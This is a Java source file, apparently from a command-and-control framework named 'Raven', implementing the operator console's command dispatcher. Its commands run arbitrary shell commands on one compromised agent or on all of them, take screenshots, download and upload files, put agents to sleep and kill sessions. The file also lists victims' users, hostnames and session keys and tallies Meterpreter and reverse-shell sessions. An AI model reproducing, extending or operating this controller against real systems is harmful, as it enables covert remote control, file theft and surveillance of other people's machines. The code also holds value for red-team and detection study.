package com.raven.interfaces.GUI.module.core.server;

import com.raven.core.database.TeamDatabase;
import com.raven.core.server.RavenServer;
import com.raven.core.session.Session;
import com.raven.interfaces.module.core.session.SessionManager;
import javafx.application.Platform;
import javafx.scene.control.TextField;

import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.concurrent.Executors;
import java.util.function.Consumer;

public class CommandDispatcher {

    private final RavenServer server;
    private final TeamDatabase db;
    private final SessionManager sessionMgr;
    private final Consumer<String> log;
    private final String operator;

    public CommandDispatcher(RavenServer server, TeamDatabase db,
                              SessionManager sessionMgr,
                              Consumer<String> log,
                              String operator) {
        this.server     = server;
        this.db         = db;
        this.sessionMgr = sessionMgr;
        this.log        = log;
        this.operator   = operator;
    }

    public void Dispatch(String cmd, TextField input) {
        if (cmd == null || cmd.isBlank()) return;
        if (server == null || !server.IsRunning()) { log.accept("[!] Server not running"); return; }
        String[] parts = cmd.trim().split("\\s+", 2);
        switch (parts[0].toLowerCase()) {
            case "sessions", "agents" -> doSessions();
            case "kill"               -> doKill(parts);
            case "status"             -> doStatus();
            case "stats"              -> doStats();
            case "tasks"              -> doTasks();
            case "broadcast"          -> doBroadcast(parts);
            case "exec"               -> doExec(parts.length > 1 ? parts[1] : "");
            case "whoami",
                 "screenshot"         -> doShortcut(parts);
            case "sleep"              -> doSleep(parts);
            case "download"           -> doDownload(parts);
            case "upload"             -> doUpload(parts);
            case "sysinfo", "info"    -> doSysInfo(parts.length > 1 ? parts[1] : "");
            case "note"               -> doNote(parts.length > 1 ? parts[1] : "");
            case "getnote"            -> doGetNote(parts.length > 1 ? parts[1] : "");
            case "history"            -> doHistory(parts.length > 1 ? parts[1] : "");
            default                   -> log.accept("[!] Unknown: " + parts[0]);
        }
        if (input != null) Platform.runLater(input::clear);
    }

    private void doSessions() {
        int n = server.GetSessions().Count();
        log.accept("Sessions (" + n + "):");
        server.GetSessions().GetAll().forEach(s ->
            log.accept("  #" + s.GetId() + "  " + s.GetDisplayName()
                + "  " + s.GetUser() + "@" + s.GetHostname()
                + "  key=" + s.GetSessionKey()));
        Platform.runLater(sessionMgr::Refresh);
    }

    private void doKill(String[] parts) {
        if (parts.length < 2) { log.accept("[!] Usage: kill <id>"); return; }
        try {
            int id = Integer.parseInt(parts[1].trim());
            server.RemoveSession(id);
            log.accept("[+] Session-" + id + " terminated");
            Platform.runLater(sessionMgr::Refresh);
        } catch (NumberFormatException e) { log.accept("[!] Invalid ID"); }
    }

    private void doStatus() {
        log.accept("Status   : " + (server.IsRunning() ? "ONLINE" : "OFFLINE"));
        log.accept("Mode     : " + server.GetMode().name());
        log.accept("Address  : " + server.GetHost() + ":" + server.GetPort());
        log.accept("Sessions : " + server.GetSessions().Count());
        log.accept("Key      : " + server.GetKeyBase64());
    }

    private void doStats() {
        Map<String, Integer> stats = server.GetSessions().GetStats();
        log.accept("Total        : " + stats.get("Total"));
        log.accept("RAVEN        : " + stats.get("RAVEN"));
        log.accept("Meterpreter  : " + stats.get("METERPRETER"));
        log.accept("Reverse Shell: " + stats.get("REVERSE_SHELL"));
    }

    private void doTasks() {
        log.accept("Active sessions: " + server.GetSessions().Count());
    }

    private void doBroadcast(String[] parts) {
        if (parts.length < 2) { log.accept("[!] Usage: broadcast <cmd>"); return; }
        log.accept("Broadcasting: " + parts[1]);
        server.BroadcastAll(parts[1]).forEach((id, res) ->
            log.accept("  [" + id + "] " + (Boolean.parseBoolean(res[0]) ? "OK " : "ERR") + "  " + res[1]));
    }

    private void doExec(String body) {
        String[] args = body.trim().split("\\s+", 2);
        if (args.length < 2) { log.accept("[!] Usage: exec <id> <cmd>"); return; }
        try { sessionMgr.RunAgentCommand(Integer.parseInt(args[0]), args[1], operator, log); }
        catch (NumberFormatException e) { log.accept("[!] Invalid ID"); }
    }

    private void doShortcut(String[] parts) {
        if (parts.length < 2) { log.accept("[!] Usage: " + parts[0] + " <id>"); return; }
        try { sessionMgr.RunAgentCommand(Integer.parseInt(parts[1]), parts[0], operator, log); }
        catch (NumberFormatException e) { log.accept("[!] Invalid ID"); }
    }

    private void doSleep(String[] parts) {
        if (parts.length < 2) { log.accept("[!] Usage: sleep <id> <seconds>"); return; }
        String[] args = parts[1].split("\\s+", 2);
        if (args.length < 2) { log.accept("[!] Usage: sleep <id> <seconds>"); return; }
        try { sessionMgr.RunAgentCommand(Integer.parseInt(args[0]), "sleep " + args[1], operator, log); }
        catch (NumberFormatException e) { log.accept("[!] Invalid ID"); }
    }

    private void doDownload(String[] parts) {
        if (parts.length < 2) { log.accept("[!] Usage: download <id> <path>"); return; }
        String[] args = parts[1].split("\\s+", 2);
        if (args.length < 2) { log.accept("[!] Usage: download <id> <path>"); return; }
        try { sessionMgr.RunAgentCommand(Integer.parseInt(args[0]), "download " + args[1], operator, log); }
        catch (NumberFormatException e) { log.accept("[!] Invalid ID"); }
    }

    private void doUpload(String[] parts) {
        if (parts.length < 2) { log.accept("[!] Usage: upload <id> <local> <remote>"); return; }
        String[] args = parts[1].split("\\s+", 3);
        if (args.length < 3) { log.accept("[!] Usage: upload <id> <local> <remote>"); return; }
        try { sessionMgr.RunAgentCommand(Integer.parseInt(args[0]), "upload " + args[1] + " " + args[2], operator, log); }
        catch (NumberFormatException e) { log.accept("[!] Invalid ID"); }
    }

    private void doSysInfo(String sidText) {
        try {
            Optional<Session> opt = sessionMgr.Get(Integer.parseInt(sidText.trim()));
            if (opt.isEmpty()) { log.accept("[!] Session not found"); return; }
            Session s = opt.get();
            log.accept("ID    : " + s.GetId() + "  Name: " + s.GetDisplayName() + "  Type: " + s.GetSessionType().name());
            log.accept("Host  : " + s.GetHostname() + "  User: " + s.GetUser() + "  OS: " + s.GetOs() + "  Arch: " + s.GetArch());
            log.accept("IP    : " + s.GetAgentIp() + "  Key: " + s.GetSessionKey() + "  mTLS: " + s.IsMtlsEnabled());
            log.accept("Note  : " + db.GetAgentNote(s.GetId()));
        } catch (Exception e) { log.accept("[!] Usage: sysinfo <id>"); }
    }

    private void doNote(String body) {
        String[] args = body.trim().split("\\s+", 2);
        if (args.length < 2) { log.accept("[!] Usage: note <id> <text>"); return; }
        try {
            int sid = Integer.parseInt(args[0]);
            db.SetAgentNote(sid, args[1]);
            log.accept("[+] Note saved for SESSION-" + sid);
        } catch (NumberFormatException e) { log.accept("[!] Invalid ID"); }
    }

    private void doGetNote(String sidText) {
        try {
            int sid = Integer.parseInt(sidText.trim());
            String note = db.GetAgentNote(sid);
            log.accept("Note SESSION-" + sid + ": " + (note.isEmpty() ? "(empty)" : note));
        } catch (Exception e) { log.accept("[!] Usage: getnote <id>"); }
    }

    private void doHistory(String body) {
        String[] args = body == null || body.isBlank() ? new String[0] : body.trim().split("\\s+");
        int sid   = args.length > 0 ? parseInt(args[0], 0) : 0;
        int limit = args.length > 1 ? parseInt(args[1], 25) : 25;
        List<Map<String, Object>> hist = db.GetCommandHistory(sid, limit);
        log.accept("History (" + hist.size() + " entries):");
        hist.forEach(r -> log.accept("  #" + r.getOrDefault("AgentId", "?")
            + "  " + r.getOrDefault("Operator", "?")
            + "  " + r.getOrDefault("Command", "")
            + "  [" + r.getOrDefault("Timestamp", "") + "]"));
    }

    private int parseInt(String v, int def) {
        try { return Integer.parseInt(v.trim()); } catch (Exception e) { return def; }
    }
}
